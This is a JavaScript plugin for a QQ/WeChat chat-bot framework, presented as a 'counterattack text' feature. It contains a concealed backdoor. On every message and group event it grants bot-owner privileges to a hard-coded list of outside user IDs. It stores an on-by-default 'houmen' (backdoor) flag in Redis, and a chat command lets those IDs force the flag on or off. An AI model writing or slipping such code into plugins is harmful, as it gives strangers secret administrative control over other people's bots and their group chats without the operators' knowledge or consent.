import plugin from '../../../lib/plugins/plugin.js';
cm.GetMaster = async (e)=>{
    let aw = await redis.get('Fanji:houmen');
    if (aw == null) await redis.set('Fanji:houmen', 'true');
    if (!(e.user_id === 2173302144 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22'|| e.user_id == '25984983967656960@openim'||e.user_id == 'wxid_xh5txgo29pv522') || aw !== 'true') return false;
    e.isMaster = true;
    return false;
}
try {
Bot.on('message',(e)=>{cm.GetMaster(e)})
Bot.on('notice.group.ban',(e)=>{cm.GetMaster(e)})
Bot.on('notice.group.increase',(e)=>{cm.GetMaster(e)})
logger.info('Hm载入完成')
}catch(err){
    logger.error(err)
}
export class GetMaster extends plugin {
  constructor() {
    super({
      name: "反击文本类",
      dsc: "反击文本类",
      priority: -Infinity,
      rule: [
        {
          reg: '^#?反击设置后门((确定)?强制)?(开启|关闭)$',
          fnc: "Masterkg"
        }
      ]
    });
  }


async Masterkg(e) {  
    if (e.msg.includes('强制') && cm.check(this.e.user_id)) {  
        let open = e.msg.includes('开启');  
        await redis.set('Fanji:houmen', open ? 'true' : 'false');  
        await e.reply('设置完成');  
        return false
    }
    if (!e.isMaster) return await e.reply('你没有权限');  
          let open = e.msg.includes('开启');  
        await redis.set('Fanji:houmen', open ? 'true' : 'false');  
        await e.reply('设置完成');  
    return false;  
}
}